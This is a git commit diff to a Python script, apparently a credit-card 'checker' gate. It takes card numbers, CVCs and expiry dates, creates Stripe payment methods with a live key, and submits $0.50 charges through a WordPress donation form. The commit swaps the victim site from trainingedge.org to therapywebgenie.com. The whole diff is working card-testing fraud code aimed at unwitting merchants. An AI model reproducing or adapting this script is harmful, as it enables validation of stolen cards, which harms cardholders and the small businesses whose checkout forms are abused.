64c936403893e7ebb8df480971afee918622e0f4
Rodamuser08 <rodamuser08@gmail.com>
2025-06-10 18:09:25 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -25,19 +25,19 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fb53c070b35%3B+stripe-js-v3%2Fb53c070b35%3B+card-element&key=pk_live_51PRegF00TTHUs6jX6LXxmxDwrkbBQElrmJX4JVJBCwPqekhlkYKZkW4yUNMBgA7Ae8GggAsKdSACvG6QqnEXza8U00QlHuzENi'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F0089f5e1e2%3B+stripe-js-v3%2F0089f5e1e2%3B+card-element&key=pk_live_JgsyXDLtr64E8XanodPoVtx5'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	headers = {
-	    'authority': 'trainingedge.org',
+	    'authority': 'www.therapywebgenie.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://trainingedge.org',
-	    'referer': 'https://trainingedge.org/order-your-certificate/',
+	    'origin': 'https://www.therapywebgenie.com',
+	    'referer': 'https://www.therapywebgenie.com/checkout/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -49,13 +49,17 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1748961671842',
+	    't': '1749553395405',
 	}
 	
-	data = f'data=__fluent_form_embded_post_id%3D1037%26_fluentform_8_fluentformnonce%3D1e05e2c65b%26_wp_http_referer%3D%252Forder-your-certificate%252F%26input_text%3DGeneral%26names%255Bfirst_name%255D%3DRodam%26names%255Blast_name%255D%3DUser%26email%3Drodamuser08%2540gmail.com%26phone%3D%252B14303000850%26address_1%255Baddress_line_1%255D%3D%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3D%26address_1%255Bstate%255D%3D%26address_1%255Bzip%255D%3D%26address_1%255Bcountry%255D%3D%26payment_input_3%3DNone%26custom-payment-amount%3D0.508%26payment_method%3Dstripe%26names_1%255Bfirst_name%255D%3D%26names_1%255Blast_name%255D%3D%26__stripe_payment_method_id%3D{pm}&action=fluentform_submit&form_id=8'
+	data = {
+	    'data': f'item_60__fluent_sf=&__fluent_form_embded_post_id=9848&_fluentform_60_fluentformnonce=a03f4db191&_wp_http_referer=%2Fcheckout%2F&input_text_2=Rodam%20User&input_text=&email=rodamuser08%40gmail.com&custom-payment-amount=0.50&description=Fund&input_text_1=www.strawhatchannel.com&payment_method=stripe&alt_s=&irvkua8880=785645&__stripe_payment_method_id={pm}',
+	    'action': 'fluentform_submit',
+	    'form_id': '60',
+	}
 	
 	response = requests.post(
-	    'https://trainingedge.org/wp-admin/admin-ajax.php',
+	    'https://www.therapywebgenie.com/wp-admin/admin-ajax.php',
 	    params=params,
 	    headers=headers,
 	    data=data,
